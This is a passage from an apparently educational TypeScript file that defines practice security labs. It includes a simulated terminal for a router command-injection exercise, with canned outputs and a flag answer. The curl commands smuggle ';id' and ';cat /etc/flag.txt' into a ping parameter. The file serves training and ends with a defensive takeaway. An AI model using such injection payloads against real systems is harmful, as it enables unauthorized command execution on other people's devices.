    simulatedTerminal: {
      initialPrompt: 'pentester@kali-sandbox:~$',
      availableCommands: {
        'help': 'Commands: curl <url>, clear',
        'curl "http://router.local/diag/ping?ip=127.0.0.1"': 'PING 127.0.0.1: 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms',
        'curl "http://router.local/diag/ping?ip=127.0.0.1;id"': `uid=33(www-data) gid=33(www-data) groups=33(www-data)
FLAG: FLAG{avoid_system_shells_use_execfile_arrays}`,
        'curl "http://router.local/diag/ping?ip=127.0.0.1;cat /etc/flag.txt"': `FLAG{avoid_system_shells_use_execfile_arrays}`
      }
    },
    defensiveTakeaway: 'Never pass user input directly into system shells. Use child_process.execFile with parameter arrays to disallow metacharacter parsing.'
  }
];

export const ALL_PRACTICE_LABS: PracticeLab[] = [
  ...PRACTICE_LABS_PART1,
  ...PRACTICE_LABS_PART2,
  ...PRACTICE_LABS_PART3,
];

// Alias for backward compatibility across existing views
export const PRACTICE_LABS_DATA = ALL_PRACTICE_LABS;
